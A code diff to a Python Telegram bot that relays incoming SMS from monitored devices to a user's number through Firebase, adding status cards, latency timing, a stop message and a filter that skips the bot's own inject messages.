@@ -31,9 +31,14 @@ from app.device_ui import (
     format_mynum_set_card,
     format_ping_card,
     format_premium_gate_card,
+    format_inject_startup_card,
+    format_inject_stream_card,
     format_send_queued,
     format_sim_selected_card,
     format_status_card,
+    format_stop_card,
+    STARTUP_TEST_MESSAGE,
+    STARTUP_TEST_SENDER,
     format_commands_message,
     format_guide_message,
     format_welcome_message,
@@ -133,8 +138,16 @@ async def _deliver_monitoring_started(
     *,
     message_id: int | None = None,
     reply_func=None,
+    inject_total_ms: int = 15,
 ) -> None:
+    queued_ms = max(1, inject_total_ms - 2)
     monitoring_card = format_monitoring_card(device, profile, ignored_sms=ignored)
+    startup_card = format_inject_startup_card(
+        STARTUP_TEST_SENDER,
+        STARTUP_TEST_MESSAGE,
+        queued_ms=queued_ms,
+        total_ms=inject_total_ms,
+    )
     keyboard = monitoring_keyboard(device)
 
     if message_id is not None and reply_func:
@@ -152,9 +165,38 @@ async def _deliver_monitoring_started(
         )
         await _pin_monitoring_message(bot, chat_id, sent.message_id)
 
+    await bot.send_message(chat_id=chat_id, text=startup_card, parse_mode="HTML")
+
+
+async def send_inject_stream_dm(
+    telegram_user_id: int,
+    sender: str,
+    message: str,
+    relay_ms: int = 3,
+) -> None:
+    """Astik-style [STREAM] card — owner DM only."""
+    if not settings.telegram_bot_token:
+        return
+
+    from telegram import Bot
+
+    bot = Bot(token=settings.telegram_bot_token)
+    stream_card = format_inject_stream_card(
+        sender,
+        message,
+        queued_ms=relay_ms or 3,
+        total_ms=(relay_ms or 3) + 1,
+    )
+    try:
+        await bot.send_message(chat_id=telegram_user_id, text=stream_card, parse_mode="HTML")
+    except Exception as exc:
+        logger.error("Inject stream DM failed for %s: %s", telegram_user_id, exc)
+
 
 async def notify_new_sms(sms: SMSMessage) -> None:
-    """Astik-style: Firebase inject only — no Telegram echo cards."""
+    """Inject to /mynum first, then Astik [STREAM] card in owner DM."""
+    t0 = time.perf_counter()
+
     db: Session = SessionLocal()
     try:
         monitoring_users = get_monitoring_user_ids(db, sms)
@@ -167,9 +209,10 @@ async def notify_new_sms(sms: SMSMessage) -> None:
         logger.warning("No active monitors; skipping inject")
         return
 
+    stream_targets: list[int] = []
     db = SessionLocal()
     try:
-        tasks = []
+        inject_tasks = []
         for user_id in monitoring_users:
             profile = get_monitor_profile(db, user_id)
             device = get_active_device(db, user_id)
@@ -180,13 +223,18 @@ async def notify_new_sms(sms: SMSMessage) -> None:
                 and profile.phone_number
                 and sms.device_id == device.id
             ):
-                tasks.append(
+                inject_tasks.append(
                     forward_incoming_to_mynum(db, profile, device, sms.sender, sms.message)
                 )
-        if tasks:
-            await asyncio.gather(*tasks, return_exceptions=True)
+                stream_targets.append(user_id)
+        if inject_tasks:
+            await asyncio.gather(*inject_tasks, return_exceptions=True)
     finally:
         db.close()
+
+    relay_ms = max(1, int((time.perf_counter() - t0) * 1000))
+    for user_id in stream_targets:
+        asyncio.create_task(send_inject_stream_dm(user_id, sms.sender, sms.message, relay_ms))
 
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -275,6 +323,7 @@ async def startmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYP
         return
 
     db: Session = SessionLocal()
+    inject_total_ms = 15
     try:
         profile = get_monitor_profile(db, user.id)
         device = get_active_device(db, user.id)
@@ -288,7 +337,7 @@ async def startmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYP
         db.commit()
         ignored = count_old_sms(db, device.id, profile.started_at)
         await sync_profile_to_firebase(profile, device)
-        await send_polling_startup_test(db, profile, device)
+        _, inject_total_ms = await send_polling_startup_test(db, profile, device)
     except ValueError as exc:
         message = str(exc)
         if "channel" in message.lower():
@@ -311,6 +360,7 @@ async def startmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYP
         device,
         ignored,
         reply_func=update.message.reply_text,
+        inject_total_ms=inject_total_ms or 15,
     )
     schedule_auto_stop(user.id, profile.auto_stop_minutes or 15)
 
@@ -350,12 +400,23 @@ async def addchannel_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
     )
 
 
+def _is_inject_stream_message(text: str) -> bool:
+    markers = (
+        "INJECT FORWARDED!",
+        STARTUP_TEST_MESSAGE,
+    )
+    return any(marker in text for marker in markers)
+
+
 async def channel_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     message = update.channel_post or update.message
     if not message or not message.text:
         return
 
     if message.from_user and message.from_user.is_bot:
+        return
+
+    if _is_inject_stream_message(message.text):
         return
 
     channel_id = str(message.chat_id)
@@ -402,7 +463,7 @@ async def stopmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYPE
     cancel_auto_stop(user.id)
     if profile:
         await sync_profile_to_firebase(profile, device)
-    await update.message.reply_text("🔴 <b>STOPPED</b>", parse_mode="HTML")
+    await update.message.reply_text(format_stop_card(), parse_mode="HTML")
 
 
 async def allfirebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -719,6 +780,7 @@ async def resume_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
 
     db: Session = SessionLocal()
     ignored = 0
+    inject_total_ms = 15
     try:
         profile = get_monitor_profile(db, user.id)
         device = get_active_device(db, user.id)
@@ -731,7 +793,7 @@ async def resume_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             await snapshot_firebase_sms_seen(profile, device)
             db.commit()
             await sync_profile_to_firebase(profile, device)
-            await send_polling_startup_test(db, profile, device)
+            _, inject_total_ms = await send_polling_startup_test(db, profile, device)
             ignored = count_old_sms(db, device.id, profile.started_at) if profile.started_at else 0
     except ValueError as exc:
         await update.message.reply_text(f"❌ {exc}")
@@ -747,6 +809,7 @@ async def resume_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             device,
             ignored,
             reply_func=update.message.reply_text,
+            inject_total_ms=inject_total_ms or 15,
         )
         schedule_auto_stop(user.id, profile.auto_stop_minutes or 15)
     else:
@@ -1171,7 +1234,7 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
 async def _activate_monitoring(
     db: Session,
     user_id: int,
-) -> tuple[MonitorProfile, Device, int]:
+) -> tuple[MonitorProfile, Device, int, int]:
     profile = get_monitor_profile(db, user_id)
     device = get_active_device(db, user_id)
     if not profile or not device:
@@ -1185,8 +1248,8 @@ async def _activate_monitoring(
     db.commit()
     ignored = count_old_sms(db, device.id, profile.started_at)
     await sync_profile_to_firebase(profile, device)
-    await send_polling_startup_test(db, profile, device)
-    return profile, device, ignored
+    _, inject_total_ms = await send_polling_startup_test(db, profile, device)
+    return profile, device, ignored, inject_total_ms
 
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -1229,12 +1292,12 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             device = get_active_device(db, user.id)
             cancel_auto_stop(user.id)
             await sync_profile_to_firebase(profile, device)
-            await query.edit_message_text("🔴 <b>STOPPED</b>", parse_mode="HTML")
+            await query.edit_message_text(format_stop_card(), parse_mode="HTML")
             return
 
         if data.startswith("monitor:start:"):
             try:
-                profile, device, ignored = await _activate_monitoring(db, user.id)
+                profile, device, ignored, inject_total_ms = await _activate_monitoring(db, user.id)
             except ValueError as exc:
                 message = str(exc)
                 if "select sim" in message.lower():
@@ -1257,6 +1320,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
                 ignored,
                 message_id=query.message.message_id,
                 reply_func=query.edit_message_text,
+                inject_total_ms=inject_total_ms or 15,
             )
             schedule_auto_stop(user.id, profile.auto_stop_minutes or 15)
             return
